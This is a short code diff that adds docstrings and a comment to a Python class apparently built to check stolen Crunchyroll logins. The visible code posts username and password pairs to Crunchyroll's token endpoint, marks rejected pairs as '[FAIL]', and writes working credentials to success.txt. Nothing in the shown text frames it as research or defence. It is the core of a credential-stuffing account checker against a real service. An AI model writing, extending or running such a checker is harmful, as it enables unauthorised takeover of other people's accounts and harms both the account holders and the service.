@@ -3,9 +3,13 @@ import requests
 class Crunchyroll:
 
     def __init__(self):
+     """Create a request session."""
+
      self.session = requests.Session()
     
     def request(self, user, password):
+        """Make the request with the username and password that are passed."""
+
         url = 'https://beta-api.crunchyroll.com/auth/v1/token'
 
         headers = {
@@ -21,6 +25,7 @@ class Crunchyroll:
             if('invalid_grant' in request):
                 return f"[FAIL] {user}:{password}"
             elif('access_token' in request):
+                #Save the logins on success.txt
                 with open('success.txt', 'w', encoding='utf-8') as f:
                     f.writelines(f'{user}:{password}\n')
                     
